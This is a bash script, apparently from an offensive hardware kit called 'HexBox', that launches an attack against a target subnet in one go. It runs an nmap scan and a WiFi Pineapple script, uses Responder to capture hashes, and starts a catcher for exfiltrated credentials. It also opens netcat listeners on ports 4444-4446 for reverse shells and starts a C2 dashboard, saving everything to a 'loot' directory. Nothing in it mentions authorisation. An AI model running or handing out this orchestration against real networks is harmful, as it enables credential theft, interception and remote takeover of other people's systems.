#!/bin/bash
# ~/hexbox/scripts/engage.sh - The "go loud" button

TARGET_NET=${1:-192.168.1.0/24}
LOOT=~/hexbox/loot/engagement_$(date +%s)
mkdir -p $LOOT

echo "[*] HexBox engagement starting against $TARGET_NET"

# 1. Recon from Pi
nmap -sS -sV -T4 -oA $LOOT/recon $TARGET_NET &

# 2. Spin up Pineapple
python3 ~/hexbox/scripts/pineapple_auto.py &

# 3. Start Responder for hash capture
sudo responder -I eth0 -wrf > $LOOT/responder.log 2>&1 &

# 4. Start credential catcher for OMG/Plug exfil
python3 ~/hexbox/c2/catcher.py > $LOOT/catcher.log 2>&1 &

# 5. Start netcat catchers
for port in 4444 4445 4446; do
    nc -lvnp $port > $LOOT/shell_$port.log 2>&1 &
done

# 6. Start C2 dashboard
sudo python3 ~/hexbox/c2/hexbox_c2.py > $LOOT/c2.log 2>&1 &

echo "[+] All systems engaged. Dashboard: http://$(hostname -I | awk '{print $1}'):1337"
echo "[+] Loot directory: $LOOT"
wait
